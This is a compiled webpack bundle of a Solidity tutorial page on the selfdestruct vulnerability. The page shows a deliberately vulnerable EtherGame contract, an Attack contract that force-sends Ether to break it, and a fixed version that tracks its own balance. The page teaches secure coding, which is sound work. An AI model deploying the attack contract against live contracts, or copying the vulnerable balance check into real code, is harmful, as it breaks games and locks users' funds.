"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[8050],{3905:function(e,n,t){t.d(n,{Zo:function(){return u},kt:function(){return m}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var c=r.createContext({}),s=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(c.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},p=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,c=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),p=s(t),m=a,f=p["".concat(c,".").concat(m)]||p[m]||d[m]||i;return t?r.createElement(f,o(o({ref:n},u),{},{components:t})):r.createElement(f,o({ref:n},u))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,o=new Array(i);o[0]=p;var l={};for(var c in n)hasOwnProperty.call(n,c)&&(l[c]=n[c]);l.originalType=e,l.mdxType="string"==typeof e?e:a,o[1]=l;for(var s=2;s<i;s++)o[s]=t[s];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},2015:function(e,n,t){t.r(n),t.d(n,{contentTitle:function(){return c},default:function(){return p},frontMatter:function(){return l},metadata:function(){return s},toc:function(){return u}});var r=t(7462),a=t(3366),i=(t(7294),t(3905)),o=["components"],l={title:"Self Destruct",version:"0.8.10",description:"An example of how to delete your smart contract by calling seldestruct in Solidity"},c=void 0,s={unversionedId:"Example/SelfDestruct",id:"Example/SelfDestruct",isDocsHomePage:!1,title:"Self Destruct",description:"An example of how to delete your smart contract by calling seldestruct in Solidity",source:"@site/docs/Example/SelfDestruct.md",sourceDirName:"Example",slug:"/Example/SelfDestruct",permalink:"/rooctblog/docs/Example/SelfDestruct",tags:[],version:"current",frontMatter:{title:"Self Destruct",version:"0.8.10",description:"An example of how to delete your smart contract by calling seldestruct in Solidity"},sidebar:"tutorialSidebar",previous:{title:"Re-Entrancy",permalink:"/rooctblog/docs/Example/ReEntrancy"},next:{title:"Sending Ether (transfer, send, call)",permalink:"/rooctblog/docs/Example/SendingEther"}},u=[{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],d={toc:u};function p(e){var n=e.components,t=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Contracts can be deleted from the blockchain by calling ",(0,i.kt)("inlineCode",{parentName:"p"},"selfdestruct"),"."),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"selfdestruct")," sends all remaining Ether stored in the contract to a\ndesignated address."),(0,i.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,i.kt)("p",null,"A malicious contract can use ",(0,i.kt)("inlineCode",{parentName:"p"},"selfdestruct")," to\nforce sending Ether to any contract."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n// The goal of this game is to be the 7th player to deposit 1 Ether.\n// Players can deposit only 1 Ether at a time.\n// Winner will be able to withdraw all Ether.\n\n/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/\n\ncontract EtherGame {\n    uint public targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        uint balance = address(this).balance;\n        require(balance <= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n\n')),(0,i.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,i.kt)("p",null,"Don't rely on ",(0,i.kt)("inlineCode",{parentName:"p"},"address(this).balance")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract EtherGame {\n    uint public targetAmount = 3 ether;\n    uint public balance;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, "You can only send 1 Ether");\n\n        balance += msg.value;\n        require(balance <= targetAmount, "Game is over");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, "Not winner");\n\n        (bool sent, ) = msg.sender.call{value: balance}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\n')))}p.isMDXComponent=!0}}]);